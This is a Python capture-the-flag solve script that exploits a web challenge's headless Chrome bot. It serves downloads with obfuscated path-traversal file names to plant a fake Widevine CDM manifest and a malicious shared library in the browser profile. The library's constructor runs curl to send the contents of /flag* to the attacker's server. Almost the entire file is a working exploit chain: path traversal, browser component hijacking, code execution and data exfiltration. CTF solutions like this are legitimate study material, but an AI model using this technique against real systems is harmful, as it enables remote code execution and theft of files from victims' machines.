import io
import re
import os
import sys
import uuid
import time
import base64
import requests
from threading import Thread
from flask import Flask, send_file, request

if len(sys.argv) != 4:
  print("Usage: python3 solve.py <chall addr> <evil website full URL> <evil website hostname with port>\nExample: python3 solve.py http://localhost:3000 http://192.168.1.2:3000 192.168.1.2:3000")
  sys.exit(-1)

def start_flask_server(json_file, chrome_datadir, code_manifest):
  app = Flask(__name__)

  @app.get("/")
  def index():
      return f"""
  <!doctype html>
  <html lang="fr">
    <head>
      <meta charset="utf-8" />
    </head>
    <body>
      <h1>Exploit</h1>
      <img src='/image.png'></img>
      <img src='/_platform_specific/linux_x64/libwidevinecdm.so'></img>
      <img src='/image3.png'></img>
    </body>
  </html>
  """

  @app.get("/image.png")
  def file():
      data = json_file.encode()
      return send_file(
          io.BytesIO(data),
          mimetype="application/javascript",
          as_attachment=True,
          download_name=".\t./"*10+f"/tmp/profiles/{chrome_datadir}/WidevineCdm/latest-component-updated-widevine-cdm",
          max_age=0,
      )

  @app.get("/_platform_specific/linux_x64/libwidevinecdm.so")
  def file2():
      data = open("libwidevinecdm.so","rb").read()
      return send_file(
          io.BytesIO(data),
          mimetype="application/javascript",
          as_attachment=True,
          download_name="libwidevinecdm.so",
          max_age=0,
      )
  
  @app.get("/image3.png")
  def file3():
      data = code_manifest.encode()
      return send_file(
          io.BytesIO(data),
          mimetype="application/javascript",
          as_attachment=True,
          download_name="manifest.json",
          max_age=0,
      )

  @app.post("/flag")
  def flag():
      print("[EXPLOIT] Got the flag : "+request.form.get("flag"), flush=True)
      return "thanks for this"


  if __name__ == "__main__":
      app.run(host="0.0.0.0", port=5000)

CHALL_URL = sys.argv[1]
SERVER_FULL_URL = sys.argv[2]
SERVER_HOST = sys.argv[3]
session = requests.Session()
username = str(uuid.uuid1())
password = username #user as pass :)

#register
print(f"[EXPLOIT] - Register with creds {username}:{password}")
session.post(f"{CHALL_URL}/register", data={"username":username,"password":password})

#login
print(f"[EXPLOIT] - Login with creds {username}:{password}")
session.post(f"{CHALL_URL}/login", data={"username":username,"password":password})

#recover session id for SQLi payload and after
account_infos = session.get(f"{CHALL_URL}/me").json()
print("[EXPLOIT] - Account information:")
print(account_infos)

print("[EXPLOIT] - Calling bot for datadir to initialize")
session.post(f"{CHALL_URL}/clone/check", data={"url":"https://www.google.com"})

#starting flask server and sending payload
json_file = f'{{"LastBundledVersion":"4.10.2891.0","Path":"{account_infos['clone_dir']}/{SERVER_HOST}/"}}'
code_manifest = f"""{{
  "manifest_version": 2,
  "update_url": "https://clients2.google.com/service/update2/crx",
  "name": "WidevineCdm",
  "description": "Widevine Content Decryption Module",
  "version": "4.10.2891.0",
  "minimum_chrome_version": "68.0.3430.0",
  "x-cdm-module-versions": "4",
  "x-cdm-interface-versions": "10",
  "x-cdm-host-versions": "10",
  "x-cdm-codecs": "vp8,vp09,avc1,av01",
  "x-cdm-persistent-license-support": false,
  "x-cdm-supported-encryption-schemes": [
    "cenc",
    "cbcs"
  ],
  "icons": {{
    "16": "imgs/icon-128x128.png",
    "128": "imgs/icon-128x128.png"
  }},
  "platforms": [
    {{
      "os": "linux",
      "arch": "x64",
      "sub_package_path": "_platform_specific/linux_x64/"
    }},
    {{
      "os": "linux",
      "arch": "arm64",
      "sub_package_path": "_platform_specific/linux_arm64/"
    }}
  ]
}}"""
print(f"[EXPLOIT] - Starting flask server as deamon with payload {json_file} and chrome_datadir: {account_infos['data_dir']}")
t_webserv = Thread(target=start_flask_server, args=(json_file, account_infos['data_dir'], code_manifest, ), daemon=True)
t_webserv.start()

print("[EXPLOIT] - Sleeping to be sure flask has started")
time.sleep(5)

code_libso = f"""#include <stdlib.h>

__attribute__((constructor))
void pwn() {{
    system("/bin/bash -c 'curl {sys.argv[2]}/flag --data \\"flag=$(cat /flag*)\\"'");
}}
"""

print("[EXPLOIT] - Compiling following code:")
print(code_libso)
f = open("libwidevinecdm.c","w")
f.write(code_libso)
f.close()
os.system("gcc -shared -o libwidevinecdm.so libwidevinecdm.c")

print("[EXPLOIT] - Sending URL of payload to challenge")
session.post(f"{CHALL_URL}/clone/run", data={"url":sys.argv[2]})

print("[EXPLOIT] - Sleeping to be sure path traversal has worked")
time.sleep(5)

print("[EXPLOIT] - Starting chrome on remote to trigger .so file")
session.post(f"{CHALL_URL}/clone/check", data={"url":"https://www.google.com"})

print("[EXPLOIT] - Sleeping to be sure flag has been received")
time.sleep(5)

print("[EXPLOIT] - Exploit triggered ! You should have received the flag !")

print("[EXPLOIT] - Cleaning files")
os.remove("libwidevinecdm.c")
os.remove("libwidevinecdm.so")